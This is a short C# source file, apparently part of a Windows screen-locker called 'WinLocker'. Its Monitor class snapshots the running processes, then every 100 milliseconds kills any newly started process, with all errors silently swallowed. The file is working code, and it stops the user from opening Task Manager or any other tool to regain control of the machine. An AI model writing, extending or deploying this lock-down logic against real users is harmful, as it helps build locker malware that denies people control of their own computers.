using System.Diagnostics;

namespace WinLocker
{
    internal class Monitor
    {
        private static readonly List<int> ids = new List<int>();
        private static bool _start = false;

        public static void Start()
        {
            _start = true;
            ids.Clear();
            Process[] processes = Process.GetProcesses();
            foreach (Process process in processes)
            {
                try
                {
                    ids.Add(process.Id);
                }
                catch { }
            }

            Task.Factory.StartNew(async () =>
            {
                while (_start)
                {
                   await Run();
                }
            });
        }

        public static void Stop()
        {
            _start = false;
            ids.Clear();
        }

        private static async Task Run()
        {
            Process[] processes = Process.GetProcesses();
            foreach (Process process in processes)
            {
                if (!_start)
                    break;

                try
                {
                    if (!ids.Contains(process.Id))
                    {
                        process.Kill();
                    }
                }
                catch { }
            }
            
            await Task.Delay(100);
        }
    }
}
